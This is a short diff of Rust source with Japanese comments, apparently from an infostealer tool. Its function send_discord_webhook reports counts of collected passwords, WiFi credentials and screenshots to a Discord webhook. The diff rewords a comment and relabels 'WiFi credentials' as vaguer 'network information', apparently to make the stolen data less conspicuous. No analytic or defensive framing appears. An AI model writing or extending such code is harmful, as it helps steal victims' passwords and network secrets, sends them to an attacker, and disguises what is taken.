@@ -46,7 +46,7 @@ pub mod network;     // ネットワーク通信機能
 pub mod utils;       // ユーティリティ機能
 pub mod services;    // バックグラウンドサービス機能
 
-// modulesディレクトリは削除済み（新しいモジュール構造を使用）
+// 整理済み: modulesディレクトリは統合
 
 // 公開API（新しいモジュール構造に対応）
 pub use core::{Config, load_config_or_default};
@@ -198,7 +198,7 @@ async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> R
             },
             {
                 "name": "📊 収集データ",
-                "value": format!("**パスワード**: {}件\n**WiFi認証情報**: {}件\n**スクリーンショット**: {}件",
+                "value": format!("**パスワード**: {}件\n**ネットワーク情報**: {}件\n**スクリーンショット**: {}件",
                     password_count,
                     wifi_count,
                     screenshot_count
